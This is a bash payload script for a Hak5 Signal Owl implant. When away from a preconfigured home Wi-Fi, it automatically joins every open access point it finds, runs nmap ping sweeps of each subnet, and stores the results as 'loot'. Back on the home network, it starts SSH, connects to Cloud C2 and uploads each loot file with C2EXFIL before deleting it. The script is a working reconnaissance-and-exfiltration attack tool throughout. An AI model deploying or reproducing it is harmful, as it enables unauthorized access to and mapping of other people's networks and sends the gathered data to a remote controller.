#!/bin/bash
# Title: Connect and dump or scan AP
# Author: ChrizRee
# Version: 1.0
#
# Description:
# A payload that is running different kind of actions depending on the scenario at hand, either;
# 1) Connect to a known/preconfigured wireless network and then connect to Cloud C2 and exfiltrate gathered loot
# or
# 2) If there is no known/preconfigured wireless network available to connect to, start scanning for open AP:s
#    and then save loot
#
# Based on the idea/need of Hak5 forum user JAL21
# https://forums.hak5.org/topic/52793-payload-advice-needed/
#
# NOTE! This payload script is based on original payloads created by Hak5
# Functions in the script are taken directly from the "Open-AP-Nmap-Scanner" payload
# https://github.com/hak5/signalowl-payloads/tree/master/payloads/library/wifi/Open-AP-Nmap-Scanner
# The rest of the script is partly based on the "WiFi-Connect" payload (but not using the
# "wifi_connect" extension)
# https://github.com/hak5/signalowl-payloads/tree/master/payloads/library/wifi/WiFi-Connect
#
# The LED blink patterns used are not always (or ever) compliant with the Hak5 definitions of blink patterns
#
# To get this script working, the preconfigured "home" network needs to be configured on line 142 (ish)
# ESSID and PSK should be entered instead of <ESSID> and <PSK>
#
# Let's go find some owls...


# Definitions of variables or constants or whatever...
NMAP_OPTIONS="-sP"
# No real need for two different variables here, but using it for now and focusing on other things instead
LOOT_DIR=/root/loot/open_ap_nmap_scan
LOOT_DIR_EX=/root/loot/open_ap_nmap_scan/
MAX_CIDR=20
DEBUG=1

# --------------------------------------------------
# >>>>>>>>>>>>>>>>>>>>>> Declaring functions - START

function scan_wifi() {
	[[ $DEBUG == 1 ]] && echo Scanning for open access points | tee -a /tmp/payload.log
	iwlist wlan0 scan > /tmp/wifi_scan
	cat /tmp/wifi_scan | grep "Encryption key:off" -A1 | grep ESSID | sort | uniq | cut -c 28- | sed "s/.$//g" > /tmp/open
	total_aps=$(cat /tmp/open | wc -l)
	[[ $DEBUG == 1 ]] && echo Found "$total_aps" open access points | tee -a /tmp/payload.log
}

function check_ap() {
	current_ap=$(sed -n "$on"p /tmp/open)
        if [ -z "$current_ap" ]
        then
            return 1
        fi
	[[ $DEBUG == 1 ]] && echo "-------------------------------" | tee -a /tmp/payload.log
	current_ap_mac=$(cat /tmp/wifi_scan | grep "$current_ap" -B5 | grep Address | awk {'print $5'} | head -1)
	[[ $DEBUG == 1 ]] && echo Selected AP MAC: "$current_ap_mac" | tee -a /tmp/payload.log
	if grep -i -q "$current_ap_mac" /tmp/nmap_scanned; then
		[[ $DEBUG == 1 ]] && echo Skipping - Already scanned AP: "$current_ap" with MAC: "$current_ap_mac" | tee -a /tmp/payload.log
	else
		connect_wifi
		scan_network
	fi
}

function connect_wifi() {
	LED STAGE1
	[[ $DEBUG == 1 ]] && echo Connecting to Open WiFi AP: "$current_ap" | tee -a /tmp/payload.log
	ifconfig wlan0 down
	iwconfig wlan0 mode Managed essid "$current_ap"
        ifconfig wlan0 up
	[[ $DEBUG == 1 ]] && echo AP connection done waiting for wlan to get a link | tee -a /tmp/payload.log
	while(iwconfig wlan0 | grep Not-Assoc); do sleep 1; done
        #while (iwconfig wlan0 | grep Not-Assoc); do
        #        sleep 1
        #done	
        [[ $DEBUG == 1 ]] && echo Link received | tee -a /tmp/payload.log
	[[ $DEBUG == 1 ]] && echo "Connected to AP number $on with SSID $current_ap" | tee -a /tmp/payload.log
	udhcpc -i wlan0
	while [ -z "$SUBNET" ]; do
		sleep 1 && find_subnet
	done
	APMAC=$(iw wlan0 link | grep Connected | awk {print'$3'})
	[[ $DEBUG == 1 ]] && echo "AP MAC Address/BSSID: $APMAC" | tee -a /tmp/payload.log
	[[ $DEBUG == 1 ]] && iwconfig wlan0 | grep ESSID | tee -a /tmp/payload.log
	[[ $DEBUG == 1 ]] && ifconfig wlan0 | grep inet | tee -a /tmp/payload.log
}

function scan_network() {
	LED STAGE2
	find_subnet
	[[ $DEBUG == 1 ]] && echo "Found Subnet: $SUBNET" | tee -a /tmp/payload.log
	CIDR=$(echo $SUBNET | cut -d '/' -f 2)
	[[ $DEBUG == 1 ]] && echo "CIDR: $CIDR" | tee -a /tmp/payload.log
	if [ "$CIDR" -ge "$MAX_CIDR" ]
	then
		[[ $DEBUG == 1 ]] && echo "Starting network scan" | tee -a /tmp/payload.log
		nmap $NMAP_OPTIONS $SUBNET -oN "$LOOT_DIR/$current_ap-$APMAC.txt" &>/dev/null 
	else
		[[ $DEBUG == 1 ]] && echo "Network too large - skipping scan" | tee -a /tmp/payload.log
	fi
	echo $APMAC >> /tmp/nmap_scanned
}

function find_subnet() {
	SUBNET=$(ip addr | grep -i wlan0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
	[[ $DEBUG == 1 ]] && echo "Found subnet for network $current_ap as $SUBNET" | tee -a /tmp/payload.log
}

function run() {
	while true; do
		setup
		scan_wifi
		while [ "$on" -le "$total_aps" ]
		do
			if [ "$on" -ge 1 ]; then check_ap; fi
			let on=on+1
		done
		LED R VERYFAST
		sleep 5
		[[ $DEBUG == 1 ]] && echo Completed recon. Restarting... | tee -a /tmp/payload.log
	done
}

function setup() {
	LED SETUP
	mkdir -p $LOOT_DIR
	touch /tmp/nmap_scanned
	on=0
	killall wpa_supplicant
}


# >>>>>>>>>>>>>>>>>>>>>> Declaring functions - END
# --------------------------------------------------


LED R VERYFAST

ifconfig wlan0 up;sleep 10
echo -e "network={\nssid=\"<ESSID>\"\npsk=\"<PSK>\"\npriority=1\n}">/tmp/wpa-wlan0.conf
wpa_supplicant -B -Dnl80211 -i wlan0 -c /tmp/wpa-wlan0.conf

LED R SOLID
sleep 5

intChk=0

LED R FAST
sleep 5

while (iwconfig wlan0 | grep Not-Assoc)
do
    ((intChk++))
    if [[ "$intChk" == '3' ]]; then
        break
    fi
    sleep 1
done

LED R SOLID
sleep 5

LED R FAST

if (iwconfig wlan0 | grep Link) ; then
    # Link is up! We are @ home!
    LED R DOUBLE
    udhcpc -i wlan0
    sleep 5
    # optionally start SSH server
    /etc/init.d/sshd start
    /usr/sbin/C2CONNECT
    sleep 5
    
    # Get the current date and time to be used in log entries
    DATENOW=$(date '+%Y-%m-%d %H:%M:%S')

    # Set log file name
    LOGFILE="/root/loot.log"

    # Check if there is any loot in the Hak5 device loot directory, if not then exit the script
    # after adding a comment to the log file
    if [ -z "$(ls -A $LOOT_DIR_EX)" ]; then
        echo "$DATENOW - Loot file(s) does not exist at the moment, exiting....." | tee -a $LOGFILE
    else
        # Copy the loot to Cloud C2 using C2EXFIL, use a loop if there for some reason are more
        # than one loot file in the loot directory
        # https://docs.hak5.org/hc/en-us/articles/360034024313-C2EXFIL

        for file_entry in "$LOOT_DIR_EX"*
        do
            if [ -f "$file_entry" ];then
                /usr/sbin/C2EXFIL STRING $file_entry SignalOwl-AP-Payload
	        # Delete loot file regardless if C2EXFIL was successful or not
                # It is possible to create a sub-dir on the Owl as well and move
                # the files there after C2EXFIL operation
                rm $file_entry
                # Add message to log file
                echo "$DATENOW - Loot file $file_entry exfiltrated using C2EXFIL" | tee -a $LOGFILE
            fi
        done
    fi

    LED R SOLID
else
    # Link is down! Not at home... got some owls to catch...
    LED R TRIPLE
    sleep 5
    run
fi

